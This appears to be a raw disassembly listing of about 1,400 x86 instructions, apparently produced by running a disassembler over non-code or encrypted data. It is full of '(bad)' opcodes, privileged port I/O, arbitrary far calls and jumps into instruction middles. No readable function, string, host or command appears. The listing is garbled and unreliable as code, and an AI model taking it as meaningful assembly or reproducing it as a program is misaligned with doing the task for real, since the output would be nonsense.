  6ad570:	retf   
  6ad571:	or     DWORD PTR [ebx+0x3a],0x1b854e17
  6ad578:	sbb    ebx,DWORD PTR [esi]
  6ad57a:	ret    0x7ef1
  6ad57d:	out    0xc1,eax
  6ad57f:	mov    ebp,0xe28fc373
  6ad584:	fadd   DWORD PTR [ebx-0x6]
  6ad587:	adc    eax,0x9287c346
  6ad58c:	test   BYTE PTR [ebx],cl
  6ad58e:	pop    ds
  6ad58f:	imul   edi,DWORD PTR [edx-0x1d],0x522e7a13
  6ad596:	jp     0x6ad5f7
  6ad598:	arpl   WORD PTR [edx-0x6102576a],si
  6ad59e:	mov    bh,0x23
  6ad5a0:	push   edx
  6ad5a1:	outs   dx,DWORD PTR ds:[esi]
  6ad5a2:	xlat   BYTE PTR ds:[ebx]
  6ad5a3:	sub    dl,BYTE PTR [ebx+0x30e6805e]
  6ad5a9:	mov    BYTE PTR [edx+ebp*1],dl
  6ad5ac:	push   edi
  6ad5ad:	add    al,0x9e
  6ad5af:	bound  edi,QWORD PTR [edx+0x103e1330]
  6ad5b5:	lods   al,BYTE PTR ds:[esi]
  6ad5b6:	inc    ebx
  6ad5b7:	mov    edi,0xa15edc9b
  6ad5bc:	inc    ebx
  6ad5bd:	dec    edx
  6ad5be:	ror    ebp,0xd4
  6ad5c1:	inc    esp
  6ad5c2:	imul   eax,DWORD PTR [edi+0xb8bdb46],0x71
  6ad5c9:	aaa    
  6ad5ca:	das    
  6ad5cb:	sub    DWORD PTR [ecx],esi
  6ad5cd:	test   al,0x24
  6ad5cf:	xor    cl,BYTE PTR [ecx]
  6ad5d1:	mov    ebp,0x6fdbf514
  6ad5d6:	mov    ch,BYTE PTR [ebx]
  6ad5d8:	jl     0x6ad583
  6ad5da:	adc    al,BYTE PTR [edi]
  6ad5dc:	shl    ah,cl
  6ad5de:	add    DWORD PTR [edx+eiz*2],eax
  6ad5e1:	jp     0x6ad56f
  6ad5e3:	and    ebx,0x584e5a8d
  6ad5e9:	std    
  6ad5ea:	ds mov dl,0x1
  6ad5ed:	push   cs
  6ad5ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ad5ef:	out    0xe6,eax
  6ad5f1:	pop    ebp
  6ad5f2:	nop
  6ad5f3:	fs pop es
  6ad5f5:	adc    DWORD PTR [ebx],esi
  6ad5f7:	inc    esp
  6ad5f8:	push   ebx
  6ad5f9:	add    dl,dl
  6ad5fb:	call   0x84a60d1f
  6ad600:	inc    BYTE PTR [ebx]
  6ad602:	scas   eax,DWORD PTR es:[edi]
  6ad603:	retf   
  6ad604:	(bad)  
  6ad605:	sbb    eax,0xa1bf87cd
  6ad60a:	popa   
  6ad60b:	call   0x1c9bb8e1
  6ad610:	or     DWORD PTR [ebx+eiz*2-0x7c3f2810],ebx
  6ad617:	idiv   DWORD PTR [ebx]
  6ad619:	in     eax,dx
  6ad61a:	sub    al,0x60
  6ad61c:	into   
  6ad61d:	outs   dx,DWORD PTR ds:[esi]
  6ad61e:	jo     0x6ad628
  6ad620:	(bad)  [ecx-0x42ce214e]
  6ad626:	test   DWORD PTR [esi+0x5e],eax
  6ad629:	xor    ah,BYTE PTR [ebx-0x6c]
  6ad62c:	adc    eax,0xec8a754e
  6ad631:	cmp    eax,0x7199d013
  6ad636:	or     al,0x4a
  6ad638:	xlat   BYTE PTR ds:[ebx]
  6ad639:	inc    ebp
  6ad63a:	ins    BYTE PTR es:[edi],dx
  6ad63b:	in     eax,dx
  6ad63c:	or     BYTE PTR [edi+0x26],dh
  6ad63f:	shl    DWORD PTR [eax-0x25ff2e75],1
  6ad645:	sbb    DWORD PTR [edi],edi
  6ad647:	cmp    edi,DWORD PTR ds:0x3cc6fbae
  6ad64d:	idiv   DWORD PTR [ebx+0x5a5a3c29]
  6ad653:	out    dx,al
  6ad654:	pop    edx
  6ad655:	pop    eax
  6ad656:	jno    0x6ad681
  6ad658:	inc    edx
  6ad659:	ins    BYTE PTR es:[edi],dx
  6ad65a:	mov    ds:0x7b805af7,al
  6ad65f:	add    esi,esi
  6ad661:	or     eax,0xe127b414
  6ad666:	cmp    DWORD PTR [esi-0x19],ebp
  6ad669:	inc    ecx
  6ad66a:	mov    DWORD PTR [edx],esp
  6ad66c:	pop    edi
  6ad66d:	fwait
  6ad66e:	lds    eax,FWORD PTR [edx+0x54175e5c]
  6ad674:	or     al,0xf0
  6ad676:	in     eax,dx
  6ad677:	cwde   
  6ad678:	fadd   QWORD PTR [eax+edx*2-0x65d1d8e9]
  6ad67f:	imul   eax,DWORD PTR [ebx-0x629fd09e],0x2ff14b62
  6ad689:	not    DWORD PTR [eax-0x78]
  6ad68c:	pushf  
  6ad68d:	jne    0x6ad6b7
  6ad68f:	push   ss
  6ad690:	shr    DWORD PTR [eax+0x28],cl
  6ad693:	lock loope 0x6ad6cb
  6ad696:	dec    esi
  6ad697:	jns    0x6ad6a8
  6ad699:	mov    edi,0xd2d136a2
  6ad69e:	mov    ebx,DWORD PTR [ebx+0x15b81d9d]
  6ad6a4:	aaa    
  6ad6a5:	ins    BYTE PTR es:[edi],dx
  6ad6a6:	gs mov bl,0xc9
  6ad6a9:	sub    eax,DWORD PTR [eax-0x62702c4c]
  6ad6af:	push   ss
  6ad6b0:	pop    esp
  6ad6b1:	outs   dx,DWORD PTR ds:[esi]
  6ad6b2:	pop    ds
  6ad6b3:	lods   eax,DWORD PTR ds:[esi]
  6ad6b4:	cmp    esi,edi
  6ad6b6:	add    ecx,esp
  6ad6b8:	outs   dx,DWORD PTR ds:[esi]
  6ad6b9:	dec    esi
  6ad6ba:	ds mov esi,0xb62ec441
  6ad6c0:	mov    ebp,0xc175b7c7
  6ad6c5:	shl    BYTE PTR [ecx+0x32],1
  6ad6c8:	test   DWORD PTR [ebx+0x19d3ffda],0x296408b8
  6ad6d2:	and    al,BYTE PTR [edi]
  6ad6d4:	sub    eax,0xa5f2321d
  6ad6d9:	xor    ecx,edi
  6ad6db:	inc    edx
  6ad6dc:	sbb    BYTE PTR ds:0x9e7846cd,cl
  6ad6e2:	loopne 0x6ad6d9
  6ad6e4:	sbb    ecx,esp
  6ad6e6:	and    dh,dl
  6ad6e8:	in     al,0x4
  6ad6ea:	arpl   WORD PTR [edi+0x12],si
  6ad6ed:	int    0x5c
  6ad6ef:	or     BYTE PTR [ebx-0x68],dh
  6ad6f2:	mov    eax,ds:0x4286aa9d
  6ad6f7:	adc    eax,0x91a996d6
  6ad6fc:	cmp    DWORD PTR [ebp-0x4d],0x60
  6ad700:	xchg   ecx,eax
  6ad701:	lods   ax,WORD PTR ds:[esi]
  6ad703:	and    BYTE PTR [edx+0x3],0x9f
  6ad707:	xchg   ch,cl
  6ad709:	adc    ebx,DWORD PTR [ecx-0x4d]
  6ad70c:	call   0x28a4:0xb1e407c2
  6ad713:	sti    
  6ad714:	retf   
  6ad715:	jmp    0x6b9b2f94
  6ad71a:	add    al,0xdc
  6ad71c:	and    DWORD PTR [ebx-0x30],ecx
  6ad71f:	pop    edi
  6ad720:	aad    0x33
  6ad722:	adc    bh,dl
  6ad724:	retf   0x9cd0
  6ad727:	stc    
  6ad728:	into   
  6ad729:	jne    0x6ad70a
  6ad72b:	xlat   BYTE PTR ds:[ebx]
  6ad72c:	int3   
  6ad72d:	mov    ecx,0xa37c7a7
  6ad732:	das    
  6ad733:	sub    eax,0x61a664c0
  6ad738:	(bad)  
  6ad73a:	mov    ah,0x77
  6ad73c:	ret    
  6ad73d:	popf   
  6ad73e:	out    dx,eax
  6ad73f:	stos   DWORD PTR es:[edi],eax
  6ad740:	xchg   DWORD PTR [ebp-0x6b],eax
  6ad743:	inc    ebp
  6ad744:	(bad)  
  6ad745:	xchg   ebx,eax
  6ad746:	add    eax,0x46dbba4e
  6ad74b:	sahf   
  6ad74c:	dec    ecx
  6ad74d:	repz jmp 0x922b:0xe33c8dd3
  6ad755:	(bad)  
  6ad756:	and    dl,BYTE PTR [eax]
  6ad758:	sahf   
  6ad759:	or     eax,0xfbae766c
  6ad75e:	and    edx,DWORD PTR [ebx-0x5d]
  6ad761:	cmp    ecx,ecx
  6ad763:	ret    
  6ad764:	mov    ebp,0x43b4ac1d
  6ad769:	push   esp
  6ad76a:	adc    DWORD PTR [ebx+0x23],edi
  6ad76d:	into   
  6ad76e:	cwde   
  6ad76f:	fwait
  6ad770:	nop
  6ad771:	push   edi
  6ad772:	dec    ecx
  6ad773:	push   cs
  6ad774:	mov    edi,0x3fa5bc04
  6ad779:	shr    BYTE PTR [edx-0xca24053],cl
  6ad77f:	mov    edi,0xfe156a96
  6ad784:	mov    esi,0x3e13d905
  6ad789:	and    eax,0xe4f9716c
  6ad78e:	mov    dl,0x48
  6ad790:	push   0x5ad4b62b
  6ad795:	sbb    DWORD PTR [edi-0x7ba9bfe2],edx
  6ad79b:	in     al,0x8e
  6ad79d:	sbb    BYTE PTR [ecx-0x1b960006],bl
  6ad7a3:	int    0x2d
  6ad7a5:	push   cs
  6ad7a6:	pushf  
  6ad7a7:	push   ds
  6ad7a8:	sbb    eax,edi
  6ad7aa:	mov    ecx,0x44b2853d
  6ad7af:	sbb    edx,esi
  6ad7b1:	(bad)  
  6ad7b2:	rsqrtps xmm5,XMMWORD PTR [ecx+ecx*2-0x44bd9cc9]
  6ad7ba:	cwde   
  6ad7bb:	jns    0x6ad7b2
  6ad7bd:	call   0x9815:0x85f0e583
  6ad7c4:	mov    edx,0x85d91e91
  6ad7c9:	ficomp DWORD PTR [eax-0xf]
  6ad7cc:	iret   
  6ad7cd:	retf   0x129d
  6ad7d0:	aad    0x1c
  6ad7d2:	out    0xef,al
  6ad7d4:	cmp    dh,BYTE PTR [eax]
  6ad7d6:	adc    DWORD PTR [ebx+ecx*8],ebp
  6ad7d9:	jne    0x6ad7a6
  6ad7db:	sti    
  6ad7dc:	and    ah,BYTE PTR [esi+0x1222a52f]
  6ad7e2:	mov    ecx,0x9a31eb76
  6ad7e7:	push   ds
  6ad7e8:	int    0x76
  6ad7ea:	loope  0x6ad7ab
  6ad7ec:	js     0x6ad7ff
  6ad7ee:	mov    BYTE PTR [ebx],bh
  6ad7f0:	add    BYTE PTR [eax+0x51d661a],dl
  6ad7f6:	scas   al,BYTE PTR es:[edi]
  6ad7f7:	pop    edi
  6ad7f8:	jl     0x6ad7b7
  6ad7fa:	adc    eax,0xf8bb7003
  6ad7ff:	jb     0x6ad7bd
  6ad801:	pop    edi
  6ad802:	jbe    0x6ad819
  6ad804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ad805:	(bad)  
  6ad806:	and    al,0x9a
  6ad808:	arpl   WORD PTR [ebx-0x2],ax
  6ad80b:	(bad)  
  6ad80e:	mov    cl,0x9
  6ad810:	call   0xe6f356d8
  6ad815:	cs sti 
  6ad817:	jl     0x6ad857
  6ad819:	lods   eax,DWORD PTR ds:[esi]
  6ad81a:	xchg   esi,eax
  6ad81b:	mov    al,0x3b
  6ad81d:	inc    eax
  6ad81e:	lods   eax,DWORD PTR ds:[esi]
  6ad81f:	imul   edi,DWORD PTR [esi-0x4ccb3aa3],0xb93fe7c1
  6ad829:	fisttp DWORD PTR [eax]
  6ad82b:	mov    ah,0xfe
  6ad82d:	mov    ds:0xd4a2b783,eax
  6ad832:	cld    
  6ad833:	lea    esp,[edx+0x436e537f]
  6ad839:	ins    DWORD PTR es:[edi],dx
  6ad83a:	jle    0x6ad89a
  6ad83c:	dec    ecx
  6ad83d:	mov    edx,0xfb66ca34
  6ad842:	rol    BYTE PTR [ebx+0x75a80bb3],cl
  6ad848:	dec    ecx
  6ad849:	push   esp
  6ad84a:	sub    edi,eax
  6ad84c:	cld    
  6ad84d:	push   ebx
  6ad84e:	mov    al,0xe1
  6ad850:	xlat   BYTE PTR ds:[ebx]
  6ad851:	daa    
  6ad852:	mov    esp,DWORD PTR [ebx+0x158873ee]
  6ad858:	nop
  6ad859:	push   esp
  6ad85a:	fld    QWORD PTR [ecx+0x4d8988aa]
  6ad860:	xor    BYTE PTR [ebp+0xa],ch
  6ad863:	mov    eax,0x711b7efc
  6ad868:	test   al,0xac
  6ad86a:	rcl    DWORD PTR [eax+0x7470b469],1
  6ad870:	pop    ss
  6ad871:	mov    eax,0xbea27507
  6ad876:	xchg   ebp,eax
  6ad877:	jns    0x6ad8cb
  6ad879:	aam    0x6c
  6ad87b:	mov    ebp,?
  6ad87d:	dec    eax
  6ad87e:	ins    BYTE PTR es:[edi],dx
  6ad87f:	cdq    
  6ad880:	inc    edx
  6ad881:	aam    0x92
  6ad883:	or     al,0x9e
  6ad885:	and    cl,BYTE PTR [esi-0x50]
  6ad888:	es into 
  6ad88a:	add    eax,0x533404d6
  6ad88f:	push   edi
  6ad890:	jb     0x6ad82f
  6ad892:	jmp    0xb92b:0xc1af63a4
  6ad899:	pusha  
  6ad89a:	outs   dx,BYTE PTR ds:[esi]
  6ad89b:	sub    cl,bl
  6ad89d:	inc    ebx
  6ad89e:	fld    QWORD PTR [ebx]
  6ad8a0:	jle    0x6ad8dc
  6ad8a2:	iret   
  6ad8a3:	inc    ebx
  6ad8a4:	cmp    DWORD PTR [edx+0x37],0x19
  6ad8a8:	ret    
  6ad8a9:	push   eax
  6ad8aa:	mov    cl,0xae
  6ad8ac:	sbb    eax,0xcbb93001
  6ad8b1:	leave  
  6ad8b2:	add    eax,0x5b8aa732
  6ad8b7:	jp     0x6ad926
  6ad8b9:	das    
  6ad8ba:	or     eax,0xc37aeea8
  6ad8bf:	int    0xbe
  6ad8c1:	out    0xb1,eax
  6ad8c3:	xsavec [edx-0x12fa6059]
  6ad8ca:	add    BYTE PTR [ebx+0x247e8610],bh
  6ad8d0:	or     ebp,ecx
  6ad8d2:	dec    edi
  6ad8d3:	xchg   ecx,eax
  6ad8d4:	cmc    
  6ad8d5:	push   ss
  6ad8d6:	push   ecx
  6ad8d7:	dec    esp
  6ad8d8:	adc    ecx,ebx
  6ad8da:	je     0x6ad914
  6ad8dc:	push   ss
  6ad8dd:	push   edx
  6ad8de:	std    
  6ad8df:	inc    edi
  6ad8e0:	push   esp
  6ad8e1:	lods   eax,DWORD PTR ds:[esi]
  6ad8e2:	leave  
  6ad8e3:	push   cs
  6ad8e4:	pop    es
  6ad8e5:	push   ds
  6ad8e6:	in     al,dx
  6ad8e7:	int    0xae
  6ad8e9:	neg    BYTE PTR [ecx-0x68088c61]
  6ad8ef:	ins    DWORD PTR es:[edi],dx
  6ad8f0:	dec    edx
  6ad8f1:	sbb    ebx,DWORD PTR [ecx]
  6ad8f3:	and    eax,0xc3844199
  6ad8f8:	sahf   
  6ad8f9:	repnz imul esi,DWORD PTR [ebx+0x1f],0x44926df6
  6ad901:	outs   dx,DWORD PTR ds:[esi]
  6ad902:	and    al,BYTE PTR [ecx+0x74051193]
  6ad908:	push   ebx
  6ad909:	rcl    ebp,0x5b
  6ad90c:	int3   
  6ad90d:	push   esp
  6ad90e:	and    al,0x7b
  6ad910:	cmp    DWORD PTR [esi+0x56],edx
  6ad913:	(bad)  
  6ad914:	jbe    0x6ad92f
  6ad916:	mov    esp,0xa3a48d6
  6ad91b:	inc    ebp
  6ad91c:	ja     0x6ad971
  6ad91e:	sbb    BYTE PTR [edi],0x9b
  6ad921:	adc    dh,bl
  6ad923:	cld    
  6ad924:	mov    al,ds:0x3ebde93a
  6ad929:	sbb    eax,0x753d1176
  6ad92e:	rcr    DWORD PTR [edi+0x3ae59595],0x6
  6ad935:	lahf   
  6ad936:	and    DWORD PTR [ebp-0x478e5036],eax
  6ad93c:	in     al,0xc
  6ad93e:	ret    
  6ad93f:	jmp    0xe0a1740f
  6ad944:	ror    dl,1
  6ad946:	fist   DWORD PTR [ebp+0x24]
  6ad949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ad94a:	pop    esi
  6ad94b:	nop
  6ad94c:	or     al,0xf8
  6ad94e:	jmp    0xc235f7fc
  6ad953:	je     0x6ad92c
  6ad955:	int3   
  6ad956:	into   
  6ad957:	(bad)  
  6ad958:	call   0x6c6790e7
  6ad95d:	scas   eax,DWORD PTR es:[edi]
  6ad95e:	and    bl,BYTE PTR [ebp-0x1b]
  6ad961:	popa   
  6ad962:	fcom   DWORD PTR ds:[esi]
  6ad965:	imul   ebp,DWORD PTR [eax],0x1ddbeae0
  6ad96b:	fwait
  6ad96c:	adc    eax,0xaae60ef2
  6ad971:	cmp    BYTE PTR ds:[ebp-0x1ee7e99b],ch
  6ad978:	mov    bh,0x83
  6ad97a:	adc    eax,0x2146c3f7
  6ad97f:	imul   DWORD PTR [edx]
  6ad981:	jmp    0x6ad9d2
  6ad983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ad984:	xchg   esi,eax
  6ad985:	mov    eax,0xa93d9e5f
  6ad98a:	push   edx
  6ad98b:	cmp    esi,edi
  6ad98d:	lds    esp,FWORD PTR [edi-0x6b793967]
  6ad993:	jp     0x6ad9d0
  6ad995:	or     cl,cl
  6ad997:	rol    BYTE PTR [ecx-0x4d],0x71
  6ad99b:	or     BYTE PTR [ebp+edi*1-0x15],0x93
  6ad9a0:	ret    0x742d
  6ad9a3:	push   0x61cdba26
  6ad9a8:	push   cs
  6ad9a9:	sbb    ebx,DWORD PTR [esi+0x5c70436c]
  6ad9af:	imul   ebp,DWORD PTR ds:0xa9c24307,0xffffffb7
  6ad9b6:	repnz add DWORD PTR [ebx-0xdb4ee2],edx
  6ad9bd:	jmp    0x6ad98e
  6ad9bf:	push   0xffffffe0
  6ad9c1:	test   BYTE PTR [esp+edx*4],cl
  6ad9c4:	and    BYTE PTR [ecx-0xba39631],ch
  6ad9ca:	mov    al,ds:0x2c942665
  6ad9cf:	push   ecx
  6ad9d0:	xchg   edx,eax
  6ad9d1:	repz gs cmp eax,0xcdaf866e
  6ad9d8:	rcl    BYTE PTR [ecx+ecx*1],0x90
  6ad9dc:	dec    ebx
  6ad9dd:	sbb    BYTE PTR [ecx-0x72049871],bl
  6ad9e3:	imul   ebx,DWORD PTR [eax-0x6e],0x7f
  6ad9e7:	xlat   BYTE PTR ds:[ebx]
  6ad9e8:	mov    ah,BYTE PTR [esi]
  6ad9ea:	and    eax,0x2202a5f2
  6ad9ef:	les    edi,FWORD PTR [esi-0x55]
  6ad9f2:	cmp    eax,0x3ed14fd
  6ad9f7:	pop    ss
  6ad9f8:	pop    ecx
  6ad9f9:	xor    BYTE PTR [eax+edi*4+0x26fce05e],cl
  6ada00:	lods   al,BYTE PTR ds:[esi]
  6ada01:	inc    ebx
  6ada02:	sub    ecx,DWORD PTR [ebx-0xf270029]
  6ada08:	mov    fs,edi
  6ada0a:	or     eax,0x69738054
  6ada0f:	imul   DWORD PTR [eax+0x4c8172e7]
  6ada15:	mov    esp,0x617a21a1
  6ada1a:	mov    DWORD PTR [ecx-0x3b],eax
  6ada1d:	call   0xdd6b:0x4fabc82
  6ada24:	xchg   al,dh
  6ada26:	push   esi
  6ada27:	xchg   edx,eax
  6ada28:	pop    esp
  6ada29:	pop    ss
  6ada2a:	pop    edi
  6ada2b:	mov    DWORD PTR [esi-0x24],ebx
  6ada2e:	add    ecx,DWORD PTR [esp+eax*2-0x52]
  6ada32:	jne    0x6ad9e1
  6ada34:	mov    ch,0x2b
  6ada36:	fwait
  6ada37:	adc    bl,ch
  6ada39:	mov    bl,0x82
  6ada3b:	cli    
  6ada3c:	xor    DWORD PTR [esi],ebp
  6ada3e:	push   ds
  6ada3f:	push   0x9f9d0893
  6ada44:	mov    ebp,DWORD PTR [esi+0x52]
  6ada47:	pop    esp
  6ada48:	push   ebx
  6ada49:	xchg   ebx,eax
  6ada4a:	cmp    BYTE PTR ss:[ebx+0xd],bl
  6ada4e:	xor    BYTE PTR [ebp-0x518e0bcc],dh
  6ada54:	sub    al,0x53
  6ada56:	push   0x7366c2ac
  6ada5b:	xor    BYTE PTR [edi+0x65],dh
  6ada5e:	push   cs
  6ada5f:	pop    ebx
  6ada60:	push   ebp
  6ada61:	mov    ds:0xcc5f102c,al
  6ada66:	mov    cs,WORD PTR [ecx+0x38a7f4c5]
  6ada6c:	mov    ebx,0xc843e60
  6ada71:	dec    ebp
  6ada72:	and    ch,BYTE PTR [esi]
  6ada74:	pushf  
  6ada75:	das    
  6ada76:	dec    DWORD PTR [edx-0x1]
  6ada79:	fs lahf 
  6ada7b:	inc    eax
  6ada7c:	jae    0x6adae6
  6ada7e:	fwait
  6ada7f:	inc    eax
  6ada80:	gs mov bh,0x7
  6ada83:	and    BYTE PTR [ecx+edi*8+0x4c5c8747],bl
  6ada8a:	imul   ecx,DWORD PTR [ecx-0xa],0x3d1c8899
  6ada91:	jo     0x6ada43
  6ada93:	and    DWORD PTR [eax],esi
  6ada95:	sbb    DWORD PTR [eax],eax
  6ada97:	outs   dx,BYTE PTR ds:[esi]
  6ada98:	outs   dx,DWORD PTR ds:[esi]
  6ada99:	and    BYTE PTR [esi+0x6f869e7b],0xf2
  6adaa0:	mov    ds:0x405735b4,eax
  6adaa5:	jo     0x6adadd
  6adaa7:	sbb    bl,ah
  6adaa9:	or     BYTE PTR [esi+0x35c0ec5a],al
  6adaaf:	cmovae ebx,DWORD PTR [edx-0x4493517e]
  6adab6:	aad    0x1e
  6adab8:	std    
  6adab9:	shl    BYTE PTR [ebp+edi*1-0x6cf895fb],1
  6adac0:	loop   0x6adacd
  6adac2:	jbe    0x6adb0f
  6adac4:	aam    0x15
  6adac6:	xor    eax,0xe09709c1
  6adacb:	arpl   si,bx
  6adacd:	mov    cl,0x97
  6adacf:	sub    bl,BYTE PTR [edi+0x6309a9ef]
  6adad5:	lahf   
  6adad6:	pop    ebp
  6adad7:	mov    ebx,0xa5b1a785
  6adadc:	push   ebx
  6adadd:	xor    DWORD PTR [edx],ebx
  6adadf:	ror    eax,0x50
  6adae2:	add    edi,DWORD PTR [ebx+0x57]
  6adae5:	xor    DWORD PTR [eax+0x4e4c41ae],ebx
  6adaeb:	ret    
  6adaec:	sub    al,0xf3
  6adaee:	rol    DWORD PTR [eax],0x20
  6adaf1:	or     edx,DWORD PTR [ecx]
  6adaf3:	push   ebp
  6adaf4:	jge    0x6adaab
  6adaf6:	or     edi,edi
  6adaf8:	mov    ss,WORD PTR [ebp-0x3495dd10]
  6adafe:	xor    DWORD PTR [edx+0x4c],esi
  6adb01:	push   ecx
  6adb02:	cmp    edx,DWORD PTR [eax-0x70876bca]
  6adb08:	ret    
  6adb09:	cmp    BYTE PTR [ecx+0x37],al
  6adb0c:	pop    ss
  6adb0d:	ja     0x6adb58
  6adb0f:	or     ebx,ebp
  6adb11:	adc    edi,DWORD PTR [eax-0x7a]
  6adb14:	xchg   ebx,eax
  6adb15:	mov    DWORD PTR [ebp+eiz*2+0x39929b4b],ebx
  6adb1c:	dec    ebp
  6adb1d:	in     eax,dx
  6adb1e:	inc    edi
  6adb1f:	or     bh,BYTE PTR [esi-0x67a37a86]
  6adb25:	push   esp
  6adb26:	(bad)  
  6adb28:	jo     0x6adb59
  6adb2a:	popa   
  6adb2b:	sbb    eax,0x9796a79b
  6adb30:	adc    al,0x5d
  6adb32:	jne    0x6adb8a
  6adb34:	imul   eax,DWORD PTR [edi],0x36e82c17
  6adb3a:	sub    ebx,0xffffffac
  6adb3d:	jmp    0xf10:0x39e77631
  6adb44:	repz hlt 
  6adb46:	fdivr  QWORD PTR [ecx]
  6adb48:	out    dx,al
  6adb49:	xchg   DWORD PTR [ebx+0x61],ecx
  6adb4c:	jecxz  0x6adb56
  6adb4e:	fnstcw WORD PTR [ecx-0x7576bed5]
  6adb54:	fmul   DWORD PTR [ecx]
  6adb56:	and    eax,DWORD PTR [ebx]
  6adb58:	add    dl,bl
  6adb5a:	add    BYTE PTR [ecx],cl
  6adb5c:	rcr    BYTE PTR [edi+edi*4-0x3be0b619],1
  6adb63:	mov    bh,0xeb
  6adb65:	loopne 0x6adb1d
  6adb67:	iret   
  6adb68:	dec    ecx
  6adb69:	lahf   
  6adb6a:	pop    es
  6adb6b:	pop    edi
  6adb6c:	inc    esp
  6adb6d:	add    cl,bl
  6adb6f:	jl     0x6adb57
  6adb71:	(bad)  
  6adb72:	mov    BYTE PTR [ecx+ecx*8+0x46757264],ch
  6adb79:	sub    eax,0x3d5859b1
  6adb7e:	pop    ss
  6adb7f:	push   ebp
  6adb80:	repnz popa 
  6adb82:	cs aam 0xbf
  6adb85:	sbb    ch,dl
  6adb87:	(bad)  
  6adb89:	push   ebx
  6adb8a:	dec    esi
  6adb8b:	sbb    DWORD PTR [eax],edx
  6adb8d:	es hlt 
  6adb8f:	leave  
  6adb90:	mov    ebp,cs
  6adb92:	mov    ebp,0x7851fcd1
  6adb97:	xlat   BYTE PTR ds:[ebx]
  6adb98:	(bad)  
  6adb99:	cmc    
  6adb9a:	mov    esp,0xf3cb7b04
  6adb9f:	push   ss
  6adba0:	fcom   DWORD PTR [esi+eax*4+0x6f]
  6adba4:	(bad)  
  6adba5:	or     BYTE PTR [ecx+edx*1+0x45],cl
  6adba9:	rol    DWORD PTR ss:[ebx],1
  6adbac:	scas   al,BYTE PTR es:[edi]
  6adbad:	dec    ebx
  6adbae:	xor    ch,BYTE PTR [eax+esi*2+0x76]
  6adbb2:	test   eax,0x62019acf
  6adbb7:	outs   dx,BYTE PTR ds:[esi]
  6adbb8:	pop    ebp
  6adbb9:	mov    esp,0x47541cdb
  6adbbe:	xor    esi,ecx
  6adbc0:	ret    
  6adbc1:	(bad)  
  6adbc2:	aas    
  6adbc3:	retf   
  6adbc4:	test   al,0xfe
  6adbc6:	mov    ebp,0x49754926
  6adbcb:	rcr    cl,1
  6adbcd:	nop
  6adbce:	mov    WORD PTR [esi+edx*8-0x60613890],fs
  6adbd5:	push   esi
  6adbd6:	push   esi
  6adbd7:	imul   ebp,DWORD PTR [edi],0x5e
  6adbda:	imul   BYTE PTR [esi+0x17]
  6adbdd:	pop    ds
  6adbde:	sbb    bh,BYTE PTR [eax-0x2]
  6adbe1:	aad    0x33
  6adbe3:	sub    DWORD PTR [edi],eax
  6adbe5:	sar    eax,cl
  6adbe7:	iret   
  6adbe8:	stos   DWORD PTR es:[edi],eax
  6adbe9:	call   FWORD PTR [edi-0xc609bb7]
  6adbef:	mov    DWORD PTR [edx+0x4a],0x6c827f76
  6adbf6:	gs pop edi
  6adbf8:	xor    edx,DWORD PTR [ebx-0x5]
  6adbfb:	stos   BYTE PTR es:[edi],al
  6adbfc:	dec    ebp
  6adbfd:	(bad)  
  6adbfe:	std    
  6adbff:	add    bl,ch
  6adc01:	pop    eax
  6adc02:	inc    eax
  6adc03:	adc    ecx,edx
  6adc05:	xchg   ebp,eax
  6adc06:	or     ch,BYTE PTR [edx]
  6adc08:	adc    ebx,edx
  6adc0a:	cmp    BYTE PTR [ecx+ebx*1+0x40],bl
  6adc0e:	xchg   edi,eax
  6adc0f:	xor    esi,DWORD PTR [edx-0x6346ce0b]
  6adc15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6adc16:	sub    ebx,ebp
  6adc18:	(bad)  
  6adc19:	adc    cl,BYTE PTR [edx+0x73]
  6adc1c:	xor    BYTE PTR [esi+0x40c32e04],dl
  6adc22:	iret   
  6adc23:	pusha  
  6adc24:	call   0x52bbf978
  6adc29:	inc    edx
  6adc2a:	sbb    BYTE PTR [ecx+eax*2],0x98
  6adc2e:	dec    ebx
  6adc2f:	mov    BYTE PTR [esi],bh
  6adc31:	pushf  
  6adc32:	das    
  6adc33:	mov    ds:0x6bbcec0,al
  6adc38:	scas   eax,DWORD PTR es:[edi]
  6adc39:	push   ebp
  6adc3a:	aas    
  6adc3b:	jb     0x6adc67
  6adc3d:	push   0x7cd49bc8
  6adc42:	dec    ebx
  6adc43:	outs   dx,DWORD PTR ds:[esi]
  6adc44:	shr    BYTE PTR [ebx+edx*4+0x4c],1
  6adc48:	hlt    
  6adc49:	loopne 0x6adc9a
  6adc4b:	xchg   edi,eax
  6adc4c:	mov    WORD PTR [ecx],cs
  6adc4e:	rcl    DWORD PTR [ebx+0x5e3a5f12],cl
  6adc54:	imul   ebx,ebx,0x286ef130
  6adc5a:	ja     0x6adc9a
  6adc5c:	push   0xffffffa7
  6adc5e:	cmp    eax,DWORD PTR [ecx]
  6adc60:	sti    
  6adc61:	jmp    0x6d7a:0x96a02c41
  6adc68:	in     al,dx
  6adc69:	inc    edi
  6adc6a:	std    
  6adc6b:	lahf   
  6adc6c:	jl     0x6adceb
  6adc6e:	ja     0x6adcb7
  6adc70:	repnz xor eax,0x20c0c7a
  6adc76:	or     eax,0x4c4e1be
  6adc7b:	dec    esi
  6adc7c:	sub    eax,0x454fb503
  6adc81:	or     eax,0x27615ac3
  6adc86:	xchg   esi,eax
  6adc87:	add    BYTE PTR [esi+ecx*8-0x15f0b6bd],ah
  6adc8e:	retf   0xf79d
  6adc91:	jle    0x6adc65
  6adc93:	cmp    esp,DWORD PTR [eax+0x76]
  6adc96:	lahf   
  6adc97:	call   0xf05e74ba
  6adc9c:	das    
  6adc9d:	int3   
  6adc9e:	fcomp  QWORD PTR [edx+0x54a11223]
  6adca4:	or     al,0x6c
  6adca6:	(bad)  [edi+eiz*1]
  6adca9:	jnp    0x6adc2e
  6adcab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6adcac:	pusha  
  6adcad:	aam    0xbc
  6adcaf:	stos   DWORD PTR es:[edi],eax
  6adcb0:	jbe    0x6add1c
  6adcb2:	xchg   DWORD PTR [edx],eax
  6adcb4:	loopne 0x6adcc2
  6adcb6:	cwde   
  6adcb7:	data16 mov ds:0xd32a7db,al
  6adcbd:	scas   eax,DWORD PTR es:[edi]
  6adcbe:	mov    ds:0xc2af0ede,eax
  6adcc3:	inc    dh
  6adcc5:	jmp    0xb5d4cbdc
